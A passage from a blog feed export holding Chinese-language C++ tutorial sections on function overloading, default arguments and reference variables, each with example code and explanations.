&quot;Trying to return int: &quot; &lt;&lt; i &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">//     return i;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    print(<span class="number">10</span>);          <span class="comment">// 调用版本 1 (int)</span></span><br><span class="line">    print(<span class="number">3.14</span>);        <span class="comment">// 调用版本 2 (double)</span></span><br><span class="line">    print(<span class="string">&quot;Hello&quot;</span>);     <span class="comment">// 调用版本 3 (const char*)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> msg = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">    print(msg);         <span class="comment">// 调用版本 4 (const std::string&amp;)</span></span><br><span class="line">    print(<span class="number">5</span>, <span class="number">20</span>);       <span class="comment">// 调用版本 5 (int, int)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// print(10L); // 可能产生歧义调用，因为 long 可以转换为 int 或 double</span></span><br><span class="line">                 <span class="comment">// 编译器可能报错或选择一个最佳匹配</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ul><li>  我们定义了五个名为 <code>print</code> 的函数，但它们的参数列表各不相同（类型或数量不同）。</li><li>  在 <code>main</code> 函数中，编译器根据传递给 <code>print</code> 的实参类型和数量，自动选择了正确的重载版本进行调用。</li></ul><p><strong>名称修饰 (Name Mangling):</strong></p><p>C++ 编译器内部通过一种称为<strong>名称修饰</strong>或<strong>名称改编</strong>（Name Mangling）的技术来区分同名的重载函数。它会根据函数的签名（包括参数类型）生成一个内部唯一的名称。例如，<code>print(int)</code> 和 <code>print(double)</code> 在编译后会变成不同的内部名称，这样链接器就能正确地将函数调用链接到对应的函数定义。</p><h2 id="8-4-2-何时使用函数重载"><a href="#8-4-2-何时使用函数重载" class="headerlink" title="8.4.2 何时使用函数重载"></a>8.4.2 何时使用函数重载</h2><p>函数重载是一个强大的工具，但应谨慎使用，以保持代码的清晰性。以下是一些适合使用函数重载的情况：</p><ol><li> <strong>执行概念上相似的任务:</strong> 当多个函数执行的操作逻辑上相似，只是处理的数据类型不同时（如上例中的 <code>print</code> 函数，或计算不同类型数值绝对值的 <code>abs</code> 函数）。</li><li> <strong>提供不同参数组合:</strong> 当一个任务可以通过提供不同数量或类型的参数来完成时（例如，一个构造函数可以接受不同的初始化参数组合）。</li></ol><p><strong>避免使用函数重载的情况:</strong></p><ol><li> <strong>执行完全不同的任务:</strong> 如果函数虽然名称相同，但执行的任务在逻辑上毫不相关，那么重载可能会导致混淆。此时应使用不同的函数名。</li><li> <strong>仅参数类型可通过默认参数或模板实现:</strong> 如果函数的功能差异可以通过默认参数或函数模板（见 8.5 节）更清晰地表达，那么可能不需要重载。例如，如果只是参数数量不同，且较少参数的版本可以通过为较多参数版本提供默认值来实现，那么默认参数可能更合适。</li></ol><p><strong>总结:</strong></p><p>函数重载允许我们用同一个名称定义多个功能相似但参数列表不同的函数。编译器根据调用时提供的实参来选择正确的版本。这是 C++ 实现多态性的一种方式（编译时多态），可以使代码更直观、更易用，但应确保重载的函数在逻辑上是相关的，以避免混淆。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.3 默认参数</title>
      <link href="2025/04/26/8.3_%E9%BB%98%E8%AE%A4%E5%8F%82%E6%95%B0/"/>
      <url>2025/04/26/8.3_%E9%BB%98%E8%AE%A4%E5%8F%82%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>C++ 允许在函数声明（原型）或定义中为函数的参数指定<strong>默认值</strong>。如果在调用函数时没有为带有默认值的参数提供实参，那么编译器会自动使用该参数的默认值。如果提供了实参，则使用提供的实参值，覆盖默认值。</p><p><strong>目的:</strong></p><ul><li>  提高函数的灵活性，允许用户在调用时省略某些不常用的参数。</li><li>  简化函数调用，特别是当某些参数在大多数情况下都使用相同的值时。</li></ul><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>在函数原型或定义中，通过在参数声明后使用赋值运算符 <code>=</code> 来指定默认值。</p><p><strong>语法 (在原型中指定):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">(type param1, type param2 = default_value2, type param3 = default_value3)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>重要规则:</strong></p><ol><li><strong>从右到左规则:</strong> 必须为函数参数列表<strong>从右到左</strong>依次提供默认值。如果某个参数有默认值，则其右侧的所有参数<strong>必须</strong>也有默认值。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 合法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b = <span class="number">10</span>, <span class="keyword">int</span> c = <span class="number">20</span>)</span></span>;</span><br><span class="line"><span class="comment">// 合法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">(<span class="keyword">int</span> a = <span class="number">5</span>, <span class="keyword">int</span> b = <span class="number">10</span>, <span class="keyword">int</span> c = <span class="number">20</span>)</span></span>;</span><br><span class="line"><span class="comment">// 非法！如果 b 有默认值，c 必须也有</span></span><br><span class="line"><span class="comment">// void func_error(int a, int b = 10, int c);</span></span><br></pre></td></tr></table></figure></li><li> <strong>原型 vs. 定义:</strong> 默认参数值通常在<strong>函数原型</strong>（声明）中指定，而不是在函数定义中。如果在原型中指定了默认值，则定义中不能再次指定。如果函数没有单独的原型（定义在调用之前），则可以在定义中指定默认值。将默认值放在原型中（通常在头文件里）是更好的做法，因为它向调用者清晰地展示了可以省略哪些参数。</li><li><strong>调用时的匹配:</strong> 调用函数时，提供的实参会<strong>从左到右</strong>匹配参数。不能跳过没有默认值的参数去为有默认值的参数提供值。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">func1(<span class="number">1</span>);       <span class="comment">// 等效于 func1(1, 10, 20)</span></span><br><span class="line">func1(<span class="number">1</span>, <span class="number">50</span>);   <span class="comment">// 等效于 func1(1, 50, 20)</span></span><br><span class="line">func1(<span class="number">1</span>, <span class="number">50</span>, <span class="number">30</span>); <span class="comment">// 等效于 func1(1, 50, 30)</span></span><br><span class="line"><span class="comment">// func1(1, , 30); // 非法！不能跳过参数 b</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型，指定默认参数</span></span><br><span class="line"><span class="comment">// level 默认为 1， prefix 默认为 &quot;Log: &quot;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">log_message</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message, <span class="keyword">int</span> level = <span class="number">1</span>, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; prefix = <span class="string">&quot;Log: &quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用方式 1: 提供所有参数</span></span><br><span class="line">    log_message(<span class="string">&quot;System started.&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Info: &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用方式 2: 省略最右边的 prefix 参数，使用其默认值</span></span><br><span class="line">    log_message(<span class="string">&quot;Processing data...&quot;</span>, <span class="number">2</span>); <span class="comment">// prefix 使用 &quot;Log: &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用方式 3: 省略 level 和 prefix 参数，使用它们的默认值</span></span><br><span class="line">    log_message(<span class="string">&quot;Operation complete.&quot;</span>); <span class="comment">// level 使用 1, prefix 使用 &quot;Log: &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// log_message(&quot;Error occurred&quot;, , &quot;Error: &quot;); // 非法！不能跳过 level</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义 (注意：这里不再重复默认值)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">log_message</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message, <span class="keyword">int</span> level, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; prefix)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; prefix &lt;&lt; <span class="string">&quot;[Level &quot;</span> &lt;&lt; level &lt;&lt; <span class="string">&quot;] &quot;</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Info: [Level 0] System started.</span><br><span class="line">Log: [Level 2] Processing data...</span><br><span class="line">Log: [Level 1] Operation complete.</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> <code>log_message</code> 函数的原型为 <code>level</code> 和 <code>prefix</code> 参数指定了默认值。</li><li><code>main</code> 函数展示了不同的调用方式：<ul><li>  第一次调用提供了所有三个参数。</li><li>  第二次调用只提供了 <code>message</code> 和 <code>level</code>，<code>prefix</code> 使用了默认值 <code>&quot;Log: &quot;</code>。</li><li>  第三次调用只提供了 <code>message</code>，<code>level</code> 使用了默认值 <code>1</code>，<code>prefix</code> 使用了默认值 <code>&quot;Log: &quot;</code>。</li></ul></li><li> 函数定义部分没有重复默认值，只列出了参数类型和名称。</li></ol><p>默认参数是 C++ 中一个方便的特性，可以使函数接口更加灵活和易用，尤其是在处理具有多个配置选项或不常用参数的函数时。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.2 引用变量</title>
      <link href="2025/04/26/8.2_%E5%BC%95%E7%94%A8%E5%8F%98%E9%87%8F/"/>
      <url>2025/04/26/8.2_%E5%BC%95%E7%94%A8%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<p>C++ 引入了一种新的复合类型——<strong>引用 (Reference)**。引用是已定义变量的</strong>别名 (alias)**。它提供了一种间接访问变量的方式，但语法比指针更简洁。一旦引用被初始化指向一个变量，它就不能再引用其他变量，并且对引用的所有操作实际上都作用于它所引用的原始变量。</p><h2 id="8-2-1-创建引用变量"><a href="#8-2-1-创建引用变量" class="headerlink" title="8.2.1 创建引用变量"></a>8.2.1 创建引用变量</h2><p>引用变量在声明时必须被初始化，并且其类型必须与它所引用的变量类型相匹配。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type&amp; reference_name = existing_variable;</span><br></pre></td></tr></table></figure><ul><li>  <code>type</code>: 变量的类型。</li><li>  <code>&amp;</code>: 引用声明符，紧跟在类型名之后。</li><li>  <code>reference_name</code>: 引用的名称。</li><li>  <code>existing_variable</code>: 引用所指向的已存在的变量。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rats = <span class="number">101</span>;</span><br><span class="line">    <span class="keyword">int</span>&amp; rodents = rats; <span class="comment">// rodents 是 rats 的一个引用 (别名)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;rats = &quot;</span> &lt;&lt; rats;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, rodents = &quot;</span> &lt;&lt; rodents &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: rats = 101, rodents = 101</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对引用进行操作，实际上是操作原始变量</span></span><br><span class="line">    rodents++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After rodents++:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;rats = &quot;</span> &lt;&lt; rats; <span class="comment">// rats 的值也变成了 102</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, rodents = &quot;</span> &lt;&lt; rodents &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: rats = 102, rodents = 102</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看地址，会发现它们是相同的</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of rats: &quot;</span> &lt;&lt; &amp;rats &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of rodents: &quot;</span> &lt;&lt; &amp;rodents &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出相同的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// int&amp; bad_ref; // 错误！引用必须在声明时初始化</span></span><br><span class="line">    <span class="comment">// double&amp; wrong_type = rats; // 错误！类型不匹配 (double&amp; vs int)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关键点:</strong></p><ul><li>  引用必须在声明时初始化。</li><li>  引用一旦初始化，就不能再指向其他变量。它终生都是其初始变量的别名。</li><li>  引用本身不占用独立的内存地址（或者说，它的地址就是它所引用变量的地址）。</li></ul><h2 id="8-2-2-将引用用作函数参数"><a href="#8-2-2-将引用用作函数参数" class="headerlink" title="8.2.2 将引用用作函数参数"></a>8.2.2 将引用用作函数参数</h2><p>引用最重要和最常见的用途之一是作为函数参数，这称为**按引用传递 (Pass by Reference)**。当使用引用作为函数参数时，函数接收的是原始变量的别名，而不是副本。这意味着函数可以直接访问并修改调用者作用域中的原始变量。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function_name</span><span class="params">(type&amp; ref_parameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 可以通过 ref_parameter 修改原始实参</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：使用引用参数交换两个变量的值</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：使用引用参数交换两个 int 变量的值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_ref</span><span class="params">(<span class="keyword">int</span>&amp; a, <span class="keyword">int</span>&amp; b)</span> </span>&#123; <span class="comment">// a 和 b 是调用时传入变量的别名</span></span><br><span class="line">    <span class="keyword">int</span> temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">    <span class="comment">// 对 a 和 b 的修改直接影响原始变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对比：使用指针参数交换 (传统 C 风格)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_ptr</span><span class="params">(<span class="keyword">int</span>* p_a, <span class="keyword">int</span>* p_b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = *p_a;</span><br><span class="line">    *p_a = *p_b;</span><br><span class="line">    *p_b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对比：使用值传递 (无法交换原始变量)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_val</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">    <span class="comment">// 只修改了局部副本 a 和 b</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> wallet1 = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> wallet2 = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original: wallet1 = &quot;</span> &lt;&lt; wallet1 &lt;&lt; <span class="string">&quot;, wallet2 = &quot;</span> &lt;&lt; wallet2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试使用值传递交换 (失败)</span></span><br><span class="line">    swap_val(wallet1, wallet2);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After swap_val: wallet1 = &quot;</span> &lt;&lt; wallet1 &lt;&lt; <span class="string">&quot;, wallet2 = &quot;</span> &lt;&lt; wallet2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 值不变</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用引用传递交换 (成功)</span></span><br><span class="line">    swap_ref(wallet1, wallet2);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After swap_ref: wallet1 = &quot;</span> &lt;&lt; wallet1 &lt;&lt; <span class="string">&quot;, wallet2 = &quot;</span> &lt;&lt; wallet2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 值已交换</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再次交换回来，使用指针传递 (成功)</span></span><br><span class="line">    swap_ptr(&amp;wallet1, &amp;wallet2); <span class="comment">// 注意需要传递地址</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After swap_ptr: wallet1 = &quot;</span> &lt;&lt; wallet1 &lt;&lt; <span class="string">&quot;, wallet2 = &quot;</span> &lt;&lt; wallet2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 值再次交换回来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>按引用传递 vs. 按指针传递:</strong></p><ul><li>  <strong>语法:</strong> 引用传递的调用语法更简洁自然 (<code>swap_ref(a, b)</code>)，而指针传递需要显式获取地址 (<code>swap_ptr(&amp;a, &amp;b)</code>) 并在函数内部解引用 (<code>*p_a</code>)。</li><li>  <strong>空值:</strong> 指针可以为 <code>nullptr</code>，需要在使用前检查。引用通常（在标准用法下）不会是“空”的，因为它必须引用一个已存在的对象。这使得引用在某些情况下更安全。</li><li>  <strong>目的:</strong> 两者都可以用来允许函数修改调用者的变量，以及避免大型对象的复制开销。</li></ul><h2 id="8-2-3-引用的属性和特别之处"><a href="#8-2-3-引用的属性和特别之处" class="headerlink" title="8.2.3 引用的属性和特别之处"></a>8.2.3 引用的属性和特别之处</h2><ol><li> <strong>必须初始化:</strong> 如前所述，引用在声明时必须绑定到一个已存在的对象。</li><li> <strong>不可重新绑定:</strong> 引用不能在初始化后更改其引用的对象。</li><li> <strong>行为像原变量:</strong> 对引用的操作（赋值、取地址等）通常表现得就像直接对原始变量操作一样。</li><li><strong>临时变量和 <code>const</code> 引用:</strong> 通常，不能将引用绑定到临时变量或字面值。但有一个重要的例外：<strong>常量引用 (<code>const type&amp;</code>)</strong> 可以绑定到临时变量、字面值或类型稍有不同的变量（如果可以进行隐式转换）。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> value = <span class="number">3.14</span>;</span><br><span class="line"><span class="comment">// int&amp; ref_val = value; // 错误：类型不匹配</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>&amp; const_ref_val = value; <span class="comment">// 合法！创建了一个临时的 int(3)，const_ref_val 引用这个临时变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span>&amp; ref_literal = <span class="number">5.0</span> * <span class="number">2.0</span>; <span class="comment">// 合法！引用一个临时 double(10.0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> num = <span class="number">100L</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>&amp; ref_num = num; <span class="comment">// 合法！引用一个临时的 int(100)</span></span><br></pre></td></tr></table></figure> 这种特性使得常量引用在函数参数中非常有用，因为它们可以接受更广泛的实参类型（包括字面值和需要类型转换的值），同时保证函数不会修改它们。</li></ol><h2 id="8-2-4-将引用用于结构"><a href="#8-2-4-将引用用于结构" class="headerlink" title="8.2.4 将引用用于结构"></a>8.2.4 将引用用于结构</h2><p>按引用传递对于结构体特别有用，因为它可以避免复制整个结构体（可能包含许多成员）的开销。如果函数不需要修改结构体，应使用常量引用 (<code>const struct_type&amp;</code>)。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Product</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">    <span class="keyword">int</span> quantity;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按常量引用传递结构，避免复制且不修改</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_product</span><span class="params">(<span class="keyword">const</span> Product&amp; prod)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product Name: &quot;</span> &lt;&lt; prod.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price: $&quot;</span> &lt;&lt; prod.price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Quantity: &quot;</span> &lt;&lt; prod.quantity &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// prod.price = 0.0; // 错误！不能通过 const 引用修改</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按引用传递结构，允许修改</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">apply_discount</span><span class="params">(Product&amp; prod, <span class="keyword">double</span> discount_percentage)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (discount_percentage &gt; <span class="number">0</span> &amp;&amp; discount_percentage &lt; <span class="number">100</span>) &#123;</span><br><span class="line">        prod.price *= (<span class="number">1.0</span> - discount_percentage / <span class="number">100.0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Product laptop = &#123;<span class="string">&quot;Laptop Pro&quot;</span>, <span class="number">1200.0</span>, <span class="number">10</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Initial Product ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    display_product(laptop); <span class="comment">// 高效传递，不复制</span></span><br><span class="line"></span><br><span class="line">    apply_discount(laptop, <span class="number">10.0</span>); <span class="comment">// 传递引用以修改价格</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Product After 10% Discount ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    display_product(laptop); <span class="comment">// 再次高效传递</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-2-5-将引用用于类对象"><a href="#8-2-5-将引用用于类对象" class="headerlink" title="8.2.5 将引用用于类对象"></a>8.2.5 将引用用于类对象</h2><p>将引用用于类对象与用于结构体完全相同。按常量引用 (<code>const class_type&amp;</code>) 传递是避免复制大型对象并确保函数不修改对象状态的标准做法。如果需要修改对象，则使用普通引用 